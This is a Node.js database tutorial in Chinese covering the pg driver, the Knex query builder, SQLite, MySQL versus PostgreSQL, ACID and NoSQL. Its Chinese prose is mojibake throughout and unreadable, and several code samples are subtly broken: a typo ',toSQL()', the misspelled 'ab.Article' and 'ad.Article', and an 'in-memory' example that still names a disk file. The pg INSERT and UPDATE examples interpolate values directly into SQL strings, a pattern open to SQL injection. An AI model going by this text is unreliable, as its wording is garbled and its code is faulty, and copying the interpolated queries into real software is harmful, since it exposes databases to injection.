if(err) throw err; console.log('Connected to database',db.database); // å…³é—­æ•°æ®åº“è¿žæŽ¥ Node è¿›ç¨‹å¯ä»¥é€€å‡º db.end();&#125;); æœŸé—´æŠ¥çš„ä¸€äº›é”™è¯¯ä¾‹å¦‚ï¼š 12role "Administrator" does not existrole "Administrator" is not permitted to log in å¯ä»¥é€šè¿‡ pgAdmin4 è¿›è¡Œå¯è§†åŒ–çš„é…ç½®ï¼Œåˆ›å»ºæ–°çš„è§’è‰²å¹¶ä¸”èµ‹äºˆä¸€äº›åŠŸèƒ½ï¼Œä¾‹å¦‚å¯ä»¥ç™»å…¥æˆ–è€…æ˜¯è®¾å®šä¸ºè¶…çº§ç”¨æˆ·ã€‚ å®šä¹‰è¡¨é¦–å…ˆåƒä¸‹é¢è¿™æ ·å®šä¹‰è¡¨ï¼Œç¡®å®šè¡¨ä¸­å­˜å‚¨çš„æ•°æ®å½¢å¼ã€‚ 12345678910111213const pg = require('pg');// é…ç½®è¿žæŽ¥å‚æ•°const db = new pg.Client(&#123; database: 'articles' &#125;);db.connect((err, client) =&gt; &#123; if (err) throw err; console.log('Connected to database', db.database); db.query(`CREATE TABLE IF NOT EXISTS snippets(id SERIAL,PRIMARY KEY(id),body text)`, (err, result) =&gt; &#123; if (err) throw err; console.log('Created table "snippets"'); // å…³é—­æ•°æ®åº“è¿žæŽ¥ Node è¿›ç¨‹å¯ä»¥é€€å‡º db.end(); &#125;);&#125;); å¯ä»¥shell é‡Œé¢çœ‹åˆ°è¯¥table è¡¨ æˆ–è€…æ˜¯é€šè¿‡ pgAdmin æŸ¥çœ‹ æ’å…¥æ•°æ®è¡¨å®šä¹‰å¥½äº†åŽï¼Œå¯ä»¥åƒä¸‹é¢è¿™æ ·ä½¿ç”¨ INSERT æŸ¥è¯¢æ’å…¥æ•°æ®ã€‚å¦‚æžœä¸æŒ‡å®š idï¼ŒPostgreSQL ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªã€‚è¦æƒ³çŸ¥é“ç”ŸæˆID æ˜¯ä»€ä¹ˆï¼Œéœ€è¦åœ¨æŸ¥è¯¢è¯­å¥é‡ŒåŠ ä¸Š RETURNING id,ç„¶åŽå¯ä»¥åœ¨å›žè°ƒå‡½æ•°çš„ç»“æžœé›†å‚æ•°ä¸­å¾—åˆ°idçš„å€¼ã€‚ 1234567891011121314151617db.connect((err, client) =&gt; &#123; if (err) throw err; console.log('Connected to database', db.database); const body = 'hello world'; db.query(` INSERT INTO snippets (body) VALUES ( '$&#123;body&#125;' ) RETURNING id `, (err, result) =&gt; &#123; if (err) throw err; const id = result.rows[0].id; console.log('Inserted row with id %s', id); db.end(); &#125;);&#125;); æ›´æ–°æ•°æ®æ’å…¥æ•°æ®åŽï¼Œå¯ä»¥åƒä¸‹é¢çš„ UPDATE æŸ¥è¯¢æ›´æ–°æ•°æ®ã€‚å—å½±å“çš„è®°å½•æ•°æ”¾åœ¨æŸ¥è¯¢ç»“æžœä¸­çš„ rowCount å±žæ€§ä¸Šã€‚ 12345678910111213141516171819202122db.connect((err, client) =&gt; &#123; if (err) throw err; console.log('Connected to database', db.database); const body = 'hello world'; db.query(` INSERT INTO snippets (body) VALUES ('$&#123;body&#125;') RETURNING id; `, (err, result) =&gt; &#123; if (err) throw err; const id = result.rows[0].id; const updatedBody = 'greetings, world'; console.log('Inserted row with id %s', id); db.query(` UPDATE snippets SET body = '$&#123;updatedBody&#125;' WHERE id = $&#123;id&#125;; `,(err,result) =&gt;&#123; if (err) throw err; console.log(); db.end(); &#125;); &#125;);&#125;); æŸ¥è¯¢æ•°æ®å…³ç³»åž‹æ•°æ®åº“çš„èƒ½é‡ä¸»è¦ä½“çŽ°åœ¨å¤æ‚çš„æ•°æ®æŸ¥è¯¢ä¸Šï¼ŒæŸ¥è¯¢è¯­å¥ä½¿ç”¨ SELECT ,ä¾‹å¦‚ 123456db.query(` SELECT * FROM snippets ORDER BY id;`,(err,result)=&gt;&#123; if(err) throw err; console.log(result.rows);&#125;); Postgresql v11æ–‡æ¡£ Knexå¾ˆå¤šå¼€å‘äººå‘˜ä¸å–œæ¬¢æŠŠ SQL ç›´æŽ¥æ”¾åœ¨ä»£ç é‡Œï¼Œå¸Œæœ›æœ‰ä¸€ä¸ªæŠ½è±¡å±‚éš”ç¦»ä¸€ä¸‹ã€‚å› ä¸ºç”¨å­—ç¬¦ä¸²æ‹¼æŽ¥ SQL è¯­å¥å¤ªç¹çäº†ï¼Œè€Œä¸”æŸ¥è¯¢å¯èƒ½ä¼šå˜å¾—è¶Šæ¥è¶Šéš¾ä»¥ç†è§£å’Œç»´æŠ¤ã€‚å¯¹äºŽ JavaScript æ¥è¯´æ›´æ˜¯å¦‚æ­¤ï¼Œå› ä¸ºåœ¨ ES6 æ¨¡æ¿å¸¸é‡å‡ºæ¥ä¹‹å‰ï¼Œå®ƒè¿žè¡¨ç¤ºå¤šè¡Œå­—ç¬¦ä¸²çš„è¯­æ³•éƒ½æ²¡æœ‰ã€‚ Knexæ˜¯ä¸€ä¸ªè½»ä¾¿çš„ SQL æŠ½è±¡åŒ…ï¼Œå®ƒè¢«ç§°ä¸ºæŸ¥è¯¢æž„å»ºå™¨ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥è¯¢æž„å»ºå™¨çš„å£°æ˜Žå¼ API æž„é€ å‡º SQL å­—ç¬¦ä¸²ï¼ŒKnex çš„ API ç®€å•ç›´ç™½ï¼š 12345knex(&#123; client:'mysql'&#125;) .select() .from('users') .where(&#123; id:'123'&#125;) ,toSQL(); è¿™æ®µä»£ç ä¼šç”Ÿæˆä¸€ä¸ª MySQL çš„å‚æ•°åŒ– SQL æŸ¥è¯¢ï¼š 1select * from `users` where `id` = ? æŸ¥è¯¢æž„å»ºå™¨å°½ç®¡ä¸šç•Œåœ¨ 20ä¸–çºª 80å¹´ä»£ä¸­æœŸå°±ç¡®ç«‹äº† ANSI å’Œ ISO SQL æ ‡å‡†ã€‚ä¸è¿‡ç›´åˆ°çŽ°åœ¨ï¼Œå¤§å¤šæ•°æ•°æ®åº“ç”¨çš„ä»ç„¶æ˜¯è‡ªå·±çš„ SQL æ–¹è¨€ã€‚ä½† PostgreSQL æ˜¯ä¸ªä¾‹å¤–ï¼Œå®ƒéµå¾ªäº† SQL:2008 æ ‡å‡†ã€‚æŸ¥è¯¢æž„å»ºå™¨èƒ½åœ¨æ”¯æŒå¤šç§æ•°æ®åº“çš„åŒæ—¶æ¶ˆé™¤å„ç§ SQL æ–¹è¨€çš„å·®å¼‚ï¼Œæä¾›ä¸€ä¸ªç»Ÿä¸€çš„ SQL ç”ŸæˆæŽ¥å£ã€‚å¯¹äºŽç»å¸¸è¦åœ¨ä¸åŒçš„æ•°æ®åº“æŠ€æœ¯ä¹‹é—´è¿›è¡Œåˆ‡æ¢çš„å›¢é˜Ÿæ¥è¯´ï¼ŒæŸ¥è¯¢æž„å»ºå™¨æä¾›çš„å¥½å¤„ä¸è¨€è€Œå–»ã€‚ Knex.js æ”¯æŒçš„æ•°æ®åº“æœ‰ï¼š PostgreSQL MSSQL MYSQL MariaDB SQLite3 Oracle Knex æ”¯æŒ promise å’Œ Node é£Žæ ¼çš„å›žè°ƒ ç”¨ Knex å®žçŽ°è¿žæŽ¥å’ŒæŸ¥è¯¢Knex ä¸åƒå…¶ä»–æŸ¥è¯¢æž„å»ºå™¨ï¼Œå®ƒè¿˜å¯ä»¥æ ¹æ®é€‰å®šçš„æ•°æ®åº“é©±åŠ¨è¿žæŽ¥æ•°æ®åº“å¹¶æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼š 123456db('articles') .select('title') .where(&#123;title:'Todayâ€™s News'&#125;) .then(articles =&gt;&#123; console.log(articles);&#125;); Knex æŸ¥è¯¢é»˜è®¤è¿”å›ž promise,ä½†ä¹Ÿæä¾›äº† .asCallback æ–¹æ³•ï¼Œå¯ä»¥æŒ‰ç…§æƒ¯ä¾‹æ”¯æŒå›žè°ƒå‡½æ•°ï¼š 1234567db('articles') .select('title') .where(&#123;title:'Todayâ€™s News'&#125;) .asCallback((err,articles) =&gt;&#123; if(err) throw err; console.log(articles);&#125;); ä¸‹é¢ä»£ç ç”¨ sqlit3så®žçŽ°äº†ç®€å•çš„ Article æ¨¡åž‹ï¼Œå°†å®ƒä¿å­˜ä¸º db.js ã€‚å®‰è£…ä¾èµ– 1npm install knex@~0.12.0 sqlite3@~3.1.0 --save 1234567891011121314151617181920212223242526272829303132const knex = require('knex');const db = knex(&#123; client: 'sqlite3', connection: &#123; filename: 'tldr.sqlite' &#125;, useNullAsDefault: true&#125;);module.exports = () =&gt; &#123; return db.schema.createTableIfNotExists('articles', table =&gt; &#123; table.increments('id').primary(); table.string('title'); table.text('content'); &#125;);&#125;module.exports.Article = &#123; all() &#123; return db('articles').orderBy('title'); &#125;, find(id) &#123; return db('articles').where(&#123; id &#125;).first(); &#125;, create(data) &#123; return db('articles').insert(data); &#125;, delete(id) &#123; return db('articles').del().where(&#123; id &#125;); &#125;&#125; çŽ°åœ¨å¯ä»¥ç”¨ db.Article æ·»åŠ  Article è®°å½•äº†ã€‚ 123456789101112const db = require('./db');db().then(() =&gt; &#123; ab.Article.create(&#123; title: 'my article', content: 'article content' &#125;).then(() =&gt; &#123; ad.Article.all().then(articles =&gt; &#123; console.log(articles); process.exit(); &#125;); &#125;);&#125;).catch(err =&gt; &#123; throw err &#125;); SQLite å‡ ä¹Žä¸éœ€è¦é…ç½®ï¼Œä¸ç”¨å¯åŠ¨æœåŠ¡å™¨å®ˆæŠ¤è¿›ç¨‹ï¼Œä¹Ÿä¸ç”¨åœ¨ç¨‹åºå¤–é¢åˆ›å»ºæ•°æ®åº“ã€‚SQLite æŠŠæ‰€æœ‰ä¸œè¥¿éƒ½å†™åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œã€‚è¿è¡Œå‰é¢çš„ä»£ç åŽï¼Œå½“å‰ç›®å½•ä¸‹ä¼šæœ‰ä¸€ä¸ª .sqlite æ–‡ä»¶ã€‚åˆ æŽ‰è¿™ä¸ªæ–‡ä»¶å°±èƒ½æŠŠæ•°æ®åº“æŠ¹æŽ‰ï¼š 1rm articles.sqlite SQLite è¿˜æœ‰å†…å­˜æ¨¡å¼ï¼Œå®Œå…¨ä¸ç”¨å¾€ç¡¬ç›˜é‡Œå†™ä¸œè¥¿ã€‚åœ¨è¿›è¡Œè‡ªåŠ¨åŒ–æµ‹è¯•æ—¶ï¼Œä¸€èˆ¬ä¼šç”¨è¿™ç§æ¨¡å¼é™ä½Žè¿è¡Œæ—¶é—´ï¼Œå¸¦æœ‰ï¼šmemory: çš„ç‰¹æ®Šæ–‡ä»¶åä¼šå¯ç”¨å†…å®¹æ¨¡å¼ã€‚åœ¨å¯ç”¨å†…å­˜æ¨¡å¼åŽï¼Œå¦‚æžœæœ‰å¤šä¸ªè¿žæŽ¥ï¼Œé‚£ä¹ˆæ¯ä¸ªè¿žæŽ¥éƒ½ä¼šæœ‰è‡ªå·±çš„ç§æœ‰æ•°æ®åº“ï¼š 1234567const db = knex(&#123; client: 'sqlite3', connection: &#123; filename: 'tldr.sqlite' &#125;, useNullAsDefault: true&#125;); åˆ‡æ¢æ•°æ®åº“å› ä¸ºç”¨äº† Knex,æ‰€ä»¥æŠŠä¹‹å‰ä»£ç æ¢æˆ PostgreSQL å¾ˆå®¹æ˜“ï¼Œè·Ÿ PostgreSQL æœåŠ¡å™¨äº¤äº’éœ€è¦ç”¨åˆ° pg åŒ…ï¼Œè¦å°†å…¶å®‰è£…å¥½å¹¶è·‘èµ·æ¥ã€‚æŠŠ pg åŒ…å®‰è£…ï¼Œå¹¶ç”¨ PostgreSQL çš„ createdb å‘½ä»¤åˆ›å»ºå¯¹åº”çš„æ•°æ®åº“ï¼š 12npm install pg --save createdb articles åªè¦ä¿®æ”¹ Knex çš„é…ç½®å°±èƒ½æ¢æˆè¿™ä¸ªæ–°æ•°æ®åº“ã€‚å¯¹å¤–çš„ API å’Œä½¿ç”¨è¿˜æ˜¯ä¸€æ ·çš„: 123456const db = knex(&#123; client: 'pg', connection:&#123; database: 'articles' &#125;&#125;) æ³¨æ„æŠ½è±¡æ¼æ´ž æŸ¥è¯¢æž„å»ºå™¨èƒ½å¤Ÿå¯¹ SQL è¯­æ³•åšæ ‡å‡†åŒ–å¤„ç†ï¼Œä½†æ”¹å˜ä¸äº†æ•°æ®åº“çš„è¡Œä¸ºã€‚æœ‰äº›ç‰¹æ€§åªæœ‰ç‰¹å®šæ•°æ®åº“æä¾›æ”¯æŒï¼Œè€Œä¸”å¯¹äºŽåŒæ ·çš„æŸ¥è¯¢ï¼Œä¸åŒçš„æ•°æ®åº“å¯èƒ½ä¼šæœ‰ä¸åŒçš„è¡Œä¸ºï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸¤ä¸ªç‰¹å®šä¸»é”®çš„æ–¹æ³•ï¼š table.increments(â€˜idâ€™).primary(); table.integer(â€˜idâ€™).primary() åœ¨ SQLite3 ä¸Šéƒ½æ²¡æœ‰é—®é¢˜ï¼Œä½†åœ¨ PostgreSQL ä¸Šæ’å…¥è®°å½•æ—¶ï¼Œç¬¬äºŒä¸ªä¼šå‡ºé”™ã€‚ 1"null value in column "id" violates not-null constraint" åœ¨ SQLite ä¸Šï¼Œå¦‚æžœæ’å…¥çš„è®°å½•ä¸»é”®ä¸º Null,ä¸ç®¡æ˜¯å¦é…ç½®è‡ªå¢žé•¿ä¸»é”®ï¼Œéƒ½ä¼šè‡ªåŠ¨èµ‹ç»™å®ƒä¸€ä¸ªè‡ªå¢žé•¿çš„ ID ã€‚è€Œ PostgreSQL åªæœ‰ä¸»é”®æ˜¾å¼å®šä¹‰ä¸ºè‡ªå¢žé•¿ä¸»é”®æ—¶æ‰ä¼šå¦‚æ­¤å¤„ç†ã€‚è¿™æ ·çš„è¡Œä¸ºå·®å¼‚å¾ˆå¤šï¼Œå¹¶ä¸”æœ‰äº›å·®å¼‚å¯¼è‡´çš„é”™è¯¯å¯èƒ½æ— æ³•è½»æ˜“å‘çŽ°ã€‚å¦‚æžœåˆ‡æ¢æ•°æ®åº“ï¼Œä¸€å®šè¦è¿›è¡Œå……åˆ†çš„æµ‹è¯•ã€‚ MySQL å’Œ PostgreSQLMySQL å’Œ PostgreSQL éƒ½æ˜¯æˆç†Ÿé«˜æ•ˆçš„æ•°æ®åº“ç³»ç»Ÿï¼Œå¹¶ä¸”å¯¹äºŽå¾ˆå¤šé¡¹ç›®æ¥è¯´ï¼Œå®ƒä»¬å‡ ä¹Žæ²¡æœ‰ä»€ä¹ˆå·®åˆ«ã€‚ç›´åˆ°é¡¹ç›®éœ€è¦æ‰©å¼ æ—¶ï¼Œå¼€å‘äººå‘˜æ‰ä¼šæ„Ÿè§‰åˆ°å®ƒä»¬åœ¨æŽ¥å£è¾¹ç¼˜æˆ–æŽ¥å£ä¹‹ä¸‹çš„å·®å¼‚ã€‚ å¾—æ³¨æ„çš„å·®åˆ«ï¼š PostgreSQL æ”¯æŒä¸€äº›è¡¨è¾¾èƒ½åŠ›æ›´å¼ºçš„æ•°æ®ç±»åž‹ï¼Œæ¯”å¦‚æ•°ç»„ã€JSON å’Œç”¨æˆ·å®šä¹‰çš„ç±»åž‹ï¼› PostgreSQL è‡ªå¸¦å…¨æ–‡æœç´¢åŠŸèƒ½ï¼› PostgreSQL å…¨é¢æ”¯æŒ ANSI SQL:2008 æ ‡å‡†ï¼› PostgreSQL çš„å¤åˆ¶åŠŸèƒ½ä¸å¦‚ MySQL å¼ºå¤§ï¼Œæˆ–è€…è¯´æ²¡æœ‰ç»å—è¿‡é‚£ä¹ˆä¸¥è‹›çš„è€ƒéªŒï¼› MySQL èµ„åŽ†æ›´è€ã€ç¤¾åŒºæ›´å¤§ï¼Œæœ‰æ›´å¤šçš„å·¥å…·å’Œèµ„æºï¼› MySQL æœ‰å¾ˆå¤šæœ‰å¾®å¦™å·®åˆ«çš„åˆ†æ”¯ï¼ˆæ¯”å¦‚ MariaDB å’Œ WebScaleSQL è¿™äº›å—åˆ° Facebookã€Googleã€Twitter ç­‰å…¬å¸æ”¯æŒçš„ç‰ˆæœ¬ï¼‰ MySQL çš„å¯æ’æ‹”å­˜å‚¨å¼•æ“Žä¸å¤ªå¥½ç†è§£ï¼Œç®¡ç†å’Œè°ƒä¼˜ä¹Ÿæœ‰ä¸€å®šçš„éš¾åº¦ã€‚ä¸è¿‡æ¢ä¸ªè§’åº¦æ¥çœ‹ï¼Œè¿™ä¹Ÿæ„å‘³ç€å¯ä»¥å¯¹å®ƒçš„æ€§èƒ½åšæ›´ç²¾ç»†çš„æŽ§åˆ¶ã€‚ é€‰å“ªä¸ªæ•°æ®åº“å¹¶ä¸ä¼šå½±å“é¡¹ç›®æˆåŠŸä¸Žå¦ï¼Œæ‰€ä»¥ä¸è¦åœ¨è¿™ä¸ªé—®é¢˜ä¸Šçº ç»“ã€‚å¦‚æžœæœ‰å¿…è¦ï¼Œä»¥åŽä¹Ÿå¯ä»¥åšæ•°æ®åº“è¿ç§»ï¼Œä½† PostgreSQL åº”è¯¥è¶³ä»¥æ»¡è¶³ä½ å¯¹åŠŸèƒ½ç‰¹æ€§å’Œæ‰©å±•èƒ½åŠ›çš„éœ€æ±‚ã€‚ä½†å¦‚æžœä½ æ°å¥½è¦å¯¹æ•°æ®åº“çš„è¯„ä¼°é€‰åž‹è´Ÿè´£ï¼Œåˆ™æœ‰å¿…è¦ç†Ÿæ‚‰ä¸€ä¸‹ ACID ä¿è¯ ACID ä¿è¯ACIDï¼ˆåŽŸå­æ€§ï¼ˆAtomicityï¼‰ã€ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ã€éš”ç¦»æ€§ï¼ˆIsolationï¼‰å’Œè€ç”¨æ€§ï¼ˆDurabilityï¼‰ï¼‰ æ˜¯å¯¹æ•°æ®åº“äº‹åŠ¡çš„ä¸€ç»„è¦æ±‚ï¼šåŽŸå­æ€§ã€ä¸€è‡´æ€§ã€éš”ç¦»çº¿å’Œè€ç”¨æ€§ã€‚è¿™äº›æœ¯è¯­çš„ç¡®åˆ‡å®šä¹‰å¯èƒ½ä¼šå˜ã€‚ä½†ä¸€èˆ¬æ¥è¯´ï¼Œç³»ç»Ÿå¯¹ ACID ä¿è¯è¶Šä¸¥æ ¼ï¼Œåœ¨æ€§èƒ½ä¸Šä½œå‡ºçš„è®©æ­¥å°±è¶Šå¤§ã€‚å¼€å‘äººå‘˜ç”¨ACID åˆ†ç±»æ¥äº¤æµä¸åŒæ–¹æ¡ˆæ‰€åšçš„å¦¥åï¼Œæ¯”å¦‚åœ¨èŠ NoSQL ç³»ç»Ÿæ—¶ã€‚ åŽŸå­æ€§ï¼šæ— è®ºæˆè´¥ï¼Œäº‹åŠ¡å¿…é¡»æ•´ä½“æ‰§è¡ŒåŽŸå­æ€§äº‹åŠ¡ä¸èƒ½è¢«éƒ¨åˆ†æ‰§è¡Œï¼šæˆ–è€…æ•´ä¸ªæ“ä½œéƒ½å®Œæˆäº†ï¼Œæˆ–è€…æ•°æ®åº“ä¿æŒåŽŸæ ·ã€‚æ¯”å¦‚è¯´è¦åˆ é™¤æŸä¸ªç”¨æˆ·çš„æ‰€æœ‰ç†è®ºï¼Œå¦‚æžœä½œä¸ºä¸€ä¸ªäº‹åŠ¡çš„è¯ï¼Œæˆ–è€…å…¨éƒ¨åˆ é™¤äº†ï¼Œæˆ–è€…ä¸€æ¡ä¹Ÿæ²¡æœ‰åˆ ã€‚æœ€ç»ˆä¸èƒ½æ˜¯æœ‰äº›åˆ é™¤ï¼Œæœ‰äº›è¿˜ä¿æŒåŽŸæ¥çš„çŠ¶æ€ï¼Œç”šè‡³åœ¨ç³»ç»Ÿå‡ºé”™æˆ–æ–­ç”µåŽï¼Œä»ç„¶ä¿æŒåŽŸå­æ€§ã€‚åŽŸå­æ€§ï¼šä¸å¯å†åˆ†ã€‚ ä¸€è‡´æ€§ï¼šå§‹ç»ˆç¡®ä¿çº¦æŸæ¡ä»¶æˆåŠŸå®Œæˆçš„äº‹åŠ¡å¿…é¡»ç¬¦åˆç³»ç»Ÿä¸­å®šä¹‰çš„æ‰€æœ‰æ•°æ®å®Œæ•´æ€§çº¦æŸã€‚æ¯”å¦‚ä¸»é”®å¿…é¡»å”¯ä¸€ã€æ•°æ®è¦ç¬¦åˆæŸç§ç‰¹å®šçš„æ¨¡å¼ï¼Œæˆ–è€…å¤–é”®æŒ‡å‘å­˜åœ¨çš„å®žä½“ã€‚äº§ç”Ÿä¸ä¸€è‡´çŠ¶æ€çš„äº‹åŠ¡ä¸€èˆ¬ä¹Ÿä¼šå¤±è´¥ï¼Œç„¶åŽå°é—®é¢˜æ˜¯å¯ä»¥è‡ªåŠ¨è§£å†³çš„ï¼Œæ¯”å¦‚å°†æ•°æ®è½¬æ¢æˆæ­£ç¡®çš„å½¢æ€ã€‚ éš”ç¦»æ€§ï¼šå¹¶å‘äº‹åŠ¡ä¸ä¼šäº’ç›¸å¹²æ‰°ä¸ç®¡æ˜¯å¹¶å‘è¿˜æ˜¯çº¿æ€§æ‰§è¡Œï¼Œéš”ç¦»æ€§äº‹åŠ¡çš„æ‰§è¡Œç»“æžœåº”è¯¥éƒ½æ˜¯ä¸€æ ·çš„ã€‚ç³»ç»Ÿçš„éš”ç¦»æ°´å¹³ä¼šç›´æŽ¥å½±å“å®ƒæ‰§è¡Œå¹¶å‘æ“ä½œçš„èƒ½åŠ›ã€‚å…¨å±€é”æ˜¯ä¸€ç§æ¯”è¾ƒä½Žå¹¼çš„éš”ç¦»æ–¹å¼ï¼Œç”±äºŽåœ¨äº‹åŠ¡æœŸé—´ä¼šæŠŠæ•´ä¸ªæ•°æ®åº“é”ä½ï¼Œæ‰€ä»¥åªèƒ½ä¸²è¡Œå¤„ç†äº‹åŠ¡ã€‚è¿™æ˜¯å¾ˆå¼ºçš„éš”ç¦»æ€§ä¿è¯ï¼Œä½†æ•ˆçŽ‡ä¹Ÿæžä½Žï¼›é‚£äº›è·Ÿäº‹åŠ¡å®Œå…¨æ²¡æœ‰å…³è”çš„æ•°æ®åº“é›†æ ¹æœ¬ä¸åº”è¯¥è¢«é”ä½ï¼ˆæ¯”å¦‚è¯´ï¼Œä¸€ä¸ªç”¨æˆ·æ·»åŠ è¯„è®ºæ—¶ä¸åº”è¯¥å¯¼è‡´å¦ä¸€ä¸ªç”¨æˆ·æ— æ³•æ›´è¡Œè‡ªå·±çš„ä¸ªäººèµ„æ–™ï¼‰ã€‚åœ¨çŽ°å®žæƒ…å†µä¸­ï¼Œæ•°æ®åº“ç³»ç»Ÿä¼šæä¾›ç²¾ç»†çš„å’Œæœ‰é€‰æ‹©æ€§çš„é”æ¨¡å¼ï¼ˆæ¯”å¦‚é”è‡ªå·±çš„ä¸ªäººèµ„æ–™ï¼‰ã€‚åœ¨çŽ°å®žæƒ…å†µä¸­ï¼Œæ•°æ®åº“ç³»ç»Ÿä¼šæä¾›æ›´åŠ ç²¾ç»†çš„å’Œæœ‰é€‰æ‹©æ€§çš„é”æ¨¡å¼ï¼ˆæ¯”å¦‚é”è¡¨ã€é”è®°å½•å’Œé”æ•°æ®åŸŸï¼‰ï¼Œä»¥å®žçŽ°å„ç§ç¨‹åºçš„éš”ç¦»æ°´å¹³ã€‚æ›´å¤æ‚çš„ç³»ç»Ÿç”šè‡³æœ‰å¯èƒ½ä¼šé‡‡ç”¨éš”ç¦»æ°´å¹³æœ€ä½Žçš„é”æ¨¡å¼ï¼Œä¹è§‚åœ°æ‰§è¡Œæ‰€æœ‰äº‹åŠ¡ï¼Œç›´åˆ°æ£€æµ‹åˆ°å†²çªæ—¶æ‰ä¼šé€æ­¥ç»†åŒ–é”æ¨¡å¼ã€‚ è€ç”¨æ€§ï¼šäº‹åŠ¡æ˜¯æ°¸ä¹…æ€§çš„äº‹åŠ¡çš„è€ç”¨æ€§æ˜¯å¯¹æŒä¹…æ€§ç”Ÿæ•ˆçš„ä¿è¯ï¼Œåœ¨é‡å¯ï¼Œæ–­ç”µã€ç³»ç»Ÿé”™è¯¯ç”šè‡³æ˜¯ç¡¬ä»¶å¤±æ•ˆçš„æƒ…å†µä¸‹ï¼ŒæŒç»­åŒ–çš„æ•ˆæžœä¾ç„¶ä¸å—å½±å“ã€‚æ¯”å¦‚ SQLite å†…å­˜æ¨¡å¼ä¸‹çš„äº‹åŠ¡å°±å¾ˆæ²¡æœ‰è€ç”¨æ€§ï¼Œè¿›ç¨‹é€€å‡ºåŽæ‰€æœ‰æ•°æ®éƒ½æ²¡æœ‰äº†ã€‚è€Œåœ¨ SQLite æŠŠæ•°æ®å†™åˆ°ç¡¬ç›˜ä¸­æ—¶ï¼Œäº‹åŠ¡çš„è€ç”¨æ€§å°±å¾ˆå¥½äº†ï¼Œå› ä¸ºæœºå™¨é‡å¯åŽæ•°æ®è¿˜åœ¨ã€‚ è¿™çœ‹èµ·æ¥å¥½åƒå¾ˆç®€å•ï¼šåªè¦æŠŠæ•°æ®å†™åˆ°ç¡¬ç›˜é‡Œå°±å¥½äº†ï¼Œäº‹åŠ¡å°±æœ‰è€ç”¨æ€§äº†ã€‚ä½†ç¡¬ç›˜ I/O æ˜¯æ¯”è¾ƒæ…¢çš„æ“ä½œï¼Œå³ä¾¿ç¨‹åºè§„æ¨¡å¢žé•¿æ¯”è¾ƒæ¸©å’Œæ—¶ï¼ŒI/O æ“ä½œä¹Ÿä¼šè¿…é€Ÿå˜æˆæ€§èƒ½ç“¶é¢ˆã€‚ä¸ºäº†ä¿è¯ç³»ç»Ÿæ€§èƒ½ï¼Œæœ‰äº›æ•°æ®åº“ä¼šæä¾›ä¸åŒçš„è€ç”¨æ€§æŠ˜ä¸­æ–¹æ¡ˆã€‚ NoSQLéžå…³ç³»æ¨¡åž‹çš„æ•°æ®å­˜å‚¨ç»Ÿç§°ä¸º NoSQL ã€‚å› ä¸ºçŽ°åœ¨æœ‰äº› NoSQL æ•°æ®åº“ç¡®å®žæ”¯æŒ SQL ï¼Œæ‰€ä»¥ NoSQL çš„å«ä¹‰æ›´æŽ¥è¿‘éžå…³ç³»åž‹ï¼Œæˆ–è€…è¢«å½“åšä¸ä»…æ˜¯ SQL çš„ç¼©å†™ã€‚ ä¸‹é¢ä¸¾ä¸€äº› NoSQL çš„èŒƒå¼ä»¥åŠç›¸åº”çš„æ•°æ®åº“çš„ä¾‹å­ï¼š é”®-å€¼/å…ƒç»„å­˜å‚¨â€”â€”DynamoDBã€LevelDBã€Redisã€etcdã€Aerospikeã€Berkeley DB å›¾å­˜å‚¨â€”â€”Neo4Jã€OrientDB æ–‡æ¡£å­˜å‚¨â€”â€”CouthDBã€MongoDBã€RRDtool åˆ—å­˜å‚¨â€”â€”Cassandraã€HBase æ—¶é—´åºåˆ—å­˜å‚¨â€”â€”Graphiteã€InfluxDBã€RRDtool å¤šèŒƒå¼â€”â€”Couchbaseï¼ˆæ–‡æ¡£æ•°æ®åº“ã€é”®/å€¼å­˜å‚¨ã€åˆ†å¸ƒå¼ç¼“å­˜ï¼‰ NoSQL å®˜ç½‘ä¸Šæœ‰æ›´å®Œæ•´çš„ NoSQL æ•°æ®åº“åˆ—è¡¨ã€‚å¦‚æžœä½ åªç”¨è¿‡å…³ç³»åž‹æ•°æ®åº“ï¼Œå¯èƒ½ä¸å¤ªå®¹æ˜“æŽ¥å— NoSQL çš„æ¦‚å¿µï¼Œå› ä¸º NoSQL çš„ç”¨æ³•ç»å¸¸ä¼šè¿åä½ å·²ç»ä¹ æƒ¯äº†çš„æœ€ä½³å®žè·µï¼šæ²¡æœ‰æ¨¡å¼å®šä¹‰ã€é‡å¤çš„æ•°æ®ã€æ¾æ•£çš„å¼ºåˆ¶æ€§çº¦æŸã€‚NoSQL ç³»ç»Ÿç»å¸¸ä¼šå°†èµ‹äºˆæ•°æ®åº“çš„è´£ä»»æ”¾åˆ°åº”ç”¨ç¨‹åºä¸Šã€‚è¿™çœ‹èµ·æ¥å¯èƒ½ä¼šå¾ˆä¹±ã€‚ èˆ¬æƒ…å†µä¸‹ï¼Œåªè¦ä¸€å°éƒ¨åˆ†è®¿é—®æ¨¡å¼å°±ä¼šåˆ›å»ºå¤§é‡çš„æ•°æ®åº“å·¥ä½œè´Ÿè½½ï¼Œæ¯”å¦‚ç”Ÿæˆç¨‹åºç™»å½•ç”»é¢çš„æŸ¥è¯¢ï¼Œéœ€è¦èŽ·å–å¾ˆå¤šåŸŸå¯¹è±¡ã€‚åœ¨å…³ç³»åž‹æ•°æ®åº“ä¸­ï¼Œè¦æé«˜è¯»å–æ€§èƒ½æ—¶ä¸€èˆ¬ä¼šåšéžè§„èŒƒåŒ–ï¼Œç»™å®¢æˆ·ç«¯çš„åŸŸæŸ¥è¯¢è¦ç»è¿‡é¢„å¤„ç†å¹¶å½¢æˆå¯ä»¥é™ä½ŽæŸ¥è¯¢æ¬¡æ•°çš„å½¢æ€ ä¸€èˆ¬æ¥è¯´ï¼ŒNoSQL æ•°æ®é»˜è®¤å°±æ˜¯éžè§„èŒƒåŒ–çš„ï¼Œç”šè‡³ä¼šè·³è¿‡åŸŸå»ºæ¨¡ã€‚è¿™æ ·å°±ä¸ä¼šåœ¨æ•°æ®æ¨¡åž‹ä¸Šåšè¿‡å¤šå·¥ä½œï¼Œä¿®æ”¹èµ·æ¥ä¼šæ›´è¿…é€Ÿï¼Œå¹¶å½¢æˆæ›´ç®€å•ã€æ›´å¥½æ‰§è¡Œçš„è®¾è®¡ã€‚ 